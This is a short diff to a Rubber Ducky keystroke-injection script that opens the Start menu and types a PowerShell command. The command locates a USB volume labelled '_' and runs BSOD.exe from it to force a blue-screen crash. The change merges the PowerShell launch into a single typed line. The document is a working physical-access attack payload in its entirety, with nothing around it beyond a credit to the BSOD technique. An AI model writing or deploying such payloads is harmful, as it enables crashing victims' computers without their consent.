@@ -5,12 +5,8 @@ REM BSOD teChnique: https://github.com/peewpw/Invoke-BSOD
 DELAY 2000
 CTRL ESC
 DELAY 500
-STRING powershell
-DELAY 500
-ENTER
-DELAY 500
 REM the Rubber Ducky MUST renamed on " _ " (bottom bar)
-STRING .((gwmi win32_volume -f 'label=''_''').Name+'BSOD.exe')
+STRING powershell .((gwmi win32_volume -f 'label=''_''').Name+'BSOD.exe')
 DELAY 500
 ENTER
 DELAY 500
